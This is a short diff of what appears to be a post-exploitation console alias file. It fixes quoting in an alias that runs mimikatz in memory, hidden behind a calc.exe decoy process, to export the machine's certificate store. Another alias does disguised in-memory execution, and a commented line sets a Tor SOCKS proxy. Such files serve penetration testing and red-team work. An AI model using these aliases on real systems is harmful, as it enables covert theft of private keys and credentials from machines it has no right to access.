@@ -13,6 +13,6 @@ alias -f ss1 set SESSION 1
 alias -f j jobs -l -v
 # the one below just picks the interface starting with 192 and will break when multi-command is landed
 alias -f ip ifconfig | grep "inet 192" | cut -d " " -f 2
-alias -f mimi execute -H -i -c -m -d calc.exe -f mimikatz.exe -a "'crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE" exit' 
+alias -f mimi execute -H -i -c -m -d calc.exe -f mimikatz.exe -a "'crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE" exit'" 
 alias -f in_mem execute -H -i -c -m -d calc.exe -f
 # sockit -f setg Proxies SOCKS5:127.0.0.1:9050
